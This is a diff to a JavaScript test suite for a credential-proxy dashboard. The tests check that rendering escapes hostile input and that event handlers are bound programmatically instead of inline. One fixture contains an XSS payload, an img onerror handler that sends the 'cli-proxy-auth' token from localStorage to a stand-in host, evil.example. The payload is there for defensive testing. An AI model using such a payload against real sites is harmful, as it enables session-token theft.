@@ -9,7 +9,7 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const htmlPath = path.join(__dirname, 'ui_template.html');
 
 // Minimal DOM implementation that explicitly throws if any unsafe HTML sink
-// (innerHTML, outerHTML, insertAdjacentHTML) is ever written to.
+// (innerHTML, outerHTML, insertAdjacentHTML, inline on* attributes) is ever used.
 class MockTextNode {
   constructor(data) {
     this.nodeType = 3;
@@ -28,6 +28,7 @@ class MockElement {
     this.className = '';
     this.style = {};
     this.children = [];
+    this.listeners = new Map();
     this.checked = false;
     this.value = '';
     this.disabled = false;
@@ -57,6 +58,18 @@ class MockElement {
     throw new Error(`Unsafe insertAdjacentHTML sink used on <${this.tagName}>`);
   }
 
+  setAttribute(name, _value) {
+    if (/^on/i.test(String(name))) {
+      throw new Error(`Unsafe inline event handler attribute ${name} set on <${this.tagName}>`);
+    }
+  }
+
+  addEventListener(type, listener) {
+    const list = this.listeners.get(type) || [];
+    list.push(listener);
+    this.listeners.set(type, list);
+  }
+
   appendChild(node) {
     this.children.push(node);
     return node;
@@ -68,7 +81,7 @@ class MockElement {
   }
 }
 
-function loadDashboardContext() {
+function loadDashboardContext({ fetchImpl } = {}) {
   const html = fs.readFileSync(htmlPath, 'utf8');
   const scriptMatches = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)];
   assert.equal(scriptMatches.length, 1, 'expected a single inline <script> block');
@@ -89,6 +102,8 @@ function loadDashboardContext() {
     ['errorBanner', new MockElement('div', 'errorBanner')],
     ['syncNowBtn', new MockElement('button', 'syncNowBtn')],
     ['restoreBtn', new MockElement('button', 'restoreBtn')],
+    ['refreshBtn', new MockElement('button', 'refreshBtn')],
+    ['saveConfigBtn', new MockElement('button', 'saveConfigBtn')],
   ]);
 
   const document = {
@@ -108,10 +123,14 @@ function loadDashboardContext() {
     },
   };
 
+  // Default to a non-resolving fetch so the script's boot-time loadStatus() call
+  // cannot race with assertions in async tests.
+  const defaultFetch = () => new Promise(() => {});
+
   const context = vm.createContext({
     document,
     localStorage: { getItem: () => null },
-    fetch: async () => ({ ok: true, json: async () => ({}) }),
+    fetch: fetchImpl || defaultFetch,
     console,
     Set,
     Array,
@@ -122,6 +141,7 @@ function loadDashboardContext() {
     Object,
     JSON,
     Error,
+    Promise,
   });
 
   vm.runInContext(scriptSource, context);
@@ -138,7 +158,7 @@ function collectTags(node, out = []) {
   return out;
 }
 
-test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota metadata', () => {
+test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota metadata', async () => {
   const { context, elementsById } = loadDashboardContext();
 
   const hostileLabel = '<img src=x onerror="fetch(\'https://evil.example/?k=\'+localStorage.getItem(\'cli-proxy-auth\'))">';
@@ -158,7 +178,10 @@ test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota
         provider: hostileProvider,
         quota: {
           status: 'ok',
-          rows: [{ label: hostileRowLabel, percent: 87.6 }],
+          rows: [
+            { label: hostileRowLabel, percent: 87.6 },
+            { label: 'non-numeric-pct', percent: Number.NaN },
+          ],
         },
         target: {
           bottleneckPercent: 88,
@@ -185,6 +208,9 @@ test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota
     ],
   });
 
+  // Yield to the microtask queue to prove boot-time loadStatus() does not clobber rendered state.
+  await Promise.resolve();
+
   const tbody = elementsById.get('credTableBody');
   assert.equal(tbody.children.length, 2);
 
@@ -200,6 +226,7 @@ test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota
   assert.equal(row0.children[0].children[1].textContent, hostileName);
   assert.equal(row0.children[1].textContent, hostileProvider);
   assert.equal(row0.children[2].children[0].textContent, `${hostileRowLabel}: 88%`);
+  assert.equal(row0.children[2].children[1].textContent, 'non-numeric-pct: -');
 
   // Untrusted tier value must not inject extra classes into badge className.
   const tierBadge = row0.children[4].children[0];
@@ -211,11 +238,41 @@ test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota
   assert.equal(row1.children[2].children[0].textContent, hostileQuotaStatus);
 });
 
-test('renderStatus handles empty credentials list without innerHTML', () => {
+test('renderStatus applies allowed tier badge classes for valid tiers', () => {
+  const { context, elementsById } = loadDashboardContext();
+
+  context.renderStatus({
+    config: { auto_balance_enabled: true },
+    credentials: [
+      { name: 'a.json', target: { bottleneckPercent: 80, averagePercent: 80, tier: 'healthy', priority: 0, weight: 80 } },
+      { name: 'b.json', target: { bottleneckPercent: 10, averagePercent: 30, tier: 'low', priority: -5, weight: 10 } },
+      { name: 'c.json', target: { bottleneckPercent: 2, averagePercent: 20, tier: 'critical', priority: -10, weight: 1 } },
+    ],
+  });
+
+  const tbody = elementsById.get('credTableBody');
+  assert.equal(tbody.children.length, 3);
+  assert.equal(tbody.children[0].children[4].children[0].className, 'badge healthy');
+  assert.equal(tbody.children[0].children[4].children[0].textContent, 'HEALTHY');
+  assert.equal(tbody.children[1].children[4].children[0].className, 'badge low');
+  assert.equal(tbody.children[1].children[4].children[0].textContent, 'LOW');
+  assert.equal(tbody.children[2].children[4].children[0].className, 'badge critical');
+  assert.equal(tbody.children[2].children[4].children[0].textContent, 'CRITICAL');
+});
+
+test('renderStatus handles empty credentials list and binds UI event listeners', () => {
   const { context, elementsById } = loadDashboardContext();
   context.renderStatus({ config: { auto_balance_enabled: false }, credentials: [] });
 
   const tbody = elementsById.get('credTableBody');
   assert.equal(tbody.children.length, 1);
   assert.equal(tbody.children[0].children[0].textContent, 'No credentials found.');
+
+  // Verify programmatic event binding replaced inline onclick/onchange handlers.
+  assert.equal(elementsById.get('syncNowBtn').listeners.get('click')?.length, 1);
+  assert.equal(elementsById.get('restoreBtn').listeners.get('click')?.length, 1);
+  assert.equal(elementsById.get('refreshBtn').listeners.get('click')?.length, 1);
+  assert.equal(elementsById.get('saveConfigBtn').listeners.get('click')?.length, 1);
+  assert.equal(elementsById.get('cfgEnabled').listeners.get('change')?.length, 1);
+  assert.equal(elementsById.get('cfgRestoreOnDisable').listeners.get('change')?.length, 1);
 });
